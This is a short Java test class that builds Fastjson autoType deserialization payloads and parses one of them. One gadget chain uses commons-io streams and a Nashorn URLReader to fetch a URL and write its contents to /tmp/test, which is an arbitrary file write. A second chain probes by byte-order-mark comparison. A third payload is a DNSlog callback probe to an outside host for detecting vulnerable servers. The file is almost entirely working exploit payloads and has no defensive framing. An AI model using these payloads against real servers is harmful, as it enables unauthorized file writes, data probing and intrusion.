package com.example.servletdemo;

import com.alibaba.fastjson.JSON;
import org.apache.commons.io.input.XmlStreamReader;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.BOMInputStream;

import java.net.MalformedURLException;
import java.net.URL;
import java.net.InetSocketAddress;
import java.util.Arrays;

import jdk.nashorn.api.scripting.URLReader;
import org.apache.commons.io.ByteOrderMark;
import sun.nio.cs.StreamEncoder;
/**
 * @author : Walker
 * @date : Created in 2022/5/7 9:06 AM
 * @description:
 */
public class urlconnTest1 {
    public static void main(String[] args) throws Exception {
//        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.example.servletdemo.DataSourceException\",\"dataSource\":{\"@type\":\"java.net.URL\",\"val\":\"http://127.0.0.1:8082/\"}}";
//        JSON.parseObject(json);
        String json1 = "{\n" +
                "  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "    \"delegate\":{\n" +
                "      \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\": {\"@type\": \"org.apache.commons.io.input.TeeReader\",\n" +
                "        \"input\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "          \"url\": \"http://127.0.0.1:8082/2.txt\"\n" +
                "        },\n" +
                "        \"branch\": {\"@type\":\"org.apache.commons.io.output.XmlStreamWriter\",\n" +
                "          \"file\":\"/tmp/test\",\n" +
                "          \"defaultEncoding\":\"UTF-8\"\n" +
                "        },\n" +
                "        \"closeBranch\":true\n" +
                "      },\n" +
                "      \"charsetName\": \"UTF-8\",\n" +
                "      \"bufferSize\": 8193\n" +
                "    },\n" +
                "    \"boms\": [\n" +
                "      {\n" +
                "        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "        \"charsetName\": \"UTF-8\",\n" +
                "        \"bytes\": [97]\n" +
                "      }\n" +
                "    ]\n" +
                "  },\n" +
                "  \"address\" : {\"$ref\":\"$.abc.BOM\"}\n" +
                "}";
        String json2 = "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"n40j2p.dnslog.cn\"}}";
        String json3 = "{\n" +
                "  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "    \"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "        \"url\": \"http://127.0.0.1:8082\"\n" +
                "      },\n" +
                "      \"charsetName\": \"UTF-8\",\n" +
                "      \"bufferSize\": 1024\n" +
                "    },\"boms\": [\n" +
                "      {\n" +
                "        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "        \"charsetName\": \"UTF-8\",\n" +
                "        \"bytes\": [0]\n" +
                "      }\n" +
                "    ]\n" +
                "  },\n" +
                "  \"address\" : {\"$ref\":\"$.abc.BOM\"}\n" +
                "}";
        System.out.println(JSON.parse(json1));

    }
}
